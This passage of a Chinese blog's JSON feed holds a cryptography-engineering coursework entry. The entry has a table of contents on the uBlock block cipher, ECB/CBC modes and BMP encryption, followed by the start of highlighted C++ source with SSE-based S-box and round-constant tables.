class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.300005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.302113em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">x</span></span></span></span></span></p>\n<ul>\n<li>$L $ 是图的拉普拉斯矩阵。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>L</mi><mi>k</mi></msup></mrow><annotation encoding=\"application/x-tex\">L^k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.849108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span></span></span></span></span></span></span> 表示拉普拉斯矩阵的 k 次幂。</li>\n</ul>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/bit/%E5%AF%86%E7%A0%81%E5%B7%A5%E7%A8%8B/",
            "url": "https://enjundu.github.io/bit/%E5%AF%86%E7%A0%81%E5%B7%A5%E7%A8%8B/",
            "title": "密码工程大作业",
            "date_published": "2024-07-08T07:39:23.000Z",
            "content_html": "<p>目录</p>\n<p><a href=\"#_Toc5215\">1 引言\t</a></p>\n<p><a href=\"#_Toc22057\">2. 符号\t</a></p>\n<p><a href=\"#_Toc14603\">2.1 uBlock 所用符号\t</a></p>\n<p><a href=\"#_Toc26774\">2.2 uBlock 术语解释\t</a></p>\n<p><a href=\"#_Toc7826\">2.2.1 并置\t</a><br />\n2.2.2 半字节（Nibble）\t4</p>\n<p><a href=\"#_Toc1851\">2.2.3 向量置换（Permutation of Vectors）\t</a></p>\n<p><a href=\"#_Toc25622\">2.2.4 轮密钥（Round Key）\t</a></p>\n<p><a href=\"#_Toc9457\">3.uBlock 分组密码及两种工作模式的来历\t</a></p>\n<p><a href=\"#_Toc18505\">3.1 uBlock 算法来历\t</a></p>\n<p><a href=\"#_Toc10233\">3.2 ECB 分组密码模式来历\t</a></p>\n<p><a href=\"#_Toc31089\">3.2.1 ECB 的设计背景\t</a></p>\n<p><a href=\"#_Toc2653\">3.2.2 ECB 的来历\t</a></p>\n<p><a href=\"#_Toc714\">3.2.3 ECB 的迭代过程\t</a></p>\n<p><a href=\"#_Toc9825\">3.2.4 ECB 的安全性讨论\t</a></p>\n<p>3.3 CBC 模式分析\t6<br />\n3.3.1 CBC 模式的设计背景\t6<br />\n3.3.2 CBC 模式的来历\t6<br />\n3.3.3 CBC 模式的迭代构成\t6<br />\n3.3.4 CBC 模式的安全性讨论\t7</p>\n<p><a href=\"#_Toc10676\">4. uBlock 加密算法的总体框架与数据结构\t</a></p>\n<p><a href=\"#_Toc22371\">4.1 uBlock 算法的总体框架\t</a><br />\n4.1.1 uBlock 加密算法\t7<br />\n4.1.2 uBlock 解密算法\t9<br />\n4.1.3 uBlock 密钥扩展算法\t10</p>\n<p>4.2 uBlock 算法的数据结构\t11</p>\n<p><a href=\"#_Toc24973\">4.2.1 S 盒 (Substitution boxes)\t</a></p>\n<p><a href=\"#_Toc6879\">4.2.2 向量置换 (Vector Permutations)\t</a></p>\n<p><a href=\"#_Toc29481\">4.2.3 轮密钥 (Round Keys)\t</a></p>\n<p><a href=\"#_Toc31348\">4.2.4 密钥扩展算法 (Key Schedule)\t</a></p>\n<p><a href=\"#_Toc7498\">4.2.5 数据块的处理\t</a></p>\n<p><a href=\"#_Toc3860\">5. uBlock 的算法实现\t</a><br />\n5.1 基础代码设计\t12<br />\n5.2 评估正确性\t16<br />\n5.3 评估吞吐量和速度\t17</p>\n<p><a href=\"#_Toc23937\">6 以 uBlock 的 ECB 和 CBC 模式加密朱鹮.bmp 文件\t</a><br />\n6.1 BMP 文件格式解析\t18<br />\n6.2 BMP 文件加密技巧\t18<br />\n6.3 ECE 和 CBC 模式加解密结果\t19<br />\n6.3.1 ECB 模式进行加解密\t19<br />\n6.3.2 CBC 模式进行加解密\t19<br />\n6.3.3 ECB 和 CBC 模式的分析和对比\t20</p>\n<p><a href=\"#_Toc11983\">7 总结\t</a></p>\n<h1 id=\"code\"><a class=\"anchor\" href=\"#code\">#</a> Code</h1>\n<h2 id=\"ublock_bmp加密代码cbc加密cpp\"><a class=\"anchor\" href=\"#ublock_bmp加密代码cbc加密cpp\">#</a> uBlock_bmp (加密代码)——CBC 加密.cpp</h2>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;emmintrin.h&gt;</span><span class=\"comment\">//sse2 header file(include sse header file)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pmmintrin.h&gt;</span> <span class=\"comment\">//SSE3(include emmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;tmmintrin.h&gt;</span><span class=\"comment\">//SSSE3(include pmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;smmintrin.h&gt;</span><span class=\"comment\">//SSE4.1(include tmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;nmmintrin.h&gt;</span><span class=\"comment\">//SSE4.2(include smmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span><span class=\"comment\">//(include immintrin.h)  </span></span></span><br><span class=\"line\"></span><br><span class=\"line\">__m128i S     = _mm_setr_epi8(<span class=\"number\">0x7</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>);</span><br><span class=\"line\">__m128i S_Inv = _mm_setr_epi8(<span class=\"number\">0xc</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">__m128i con = _mm_set1_epi8(<span class=\"number\">0x0f</span>);</span><br><span class=\"line\">__m128i A1 = _mm_setr_epi8(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>);\t</span><br><span class=\"line\">__m128i A2 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>);\t\t</span><br><span class=\"line\">__m128i A3 = _mm_setr_epi8(<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> Subkey[<span class=\"number\">17</span>][<span class=\"number\">32</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> RC[<span class=\"number\">16</span>][<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x2</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xc</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x4</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x5</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span 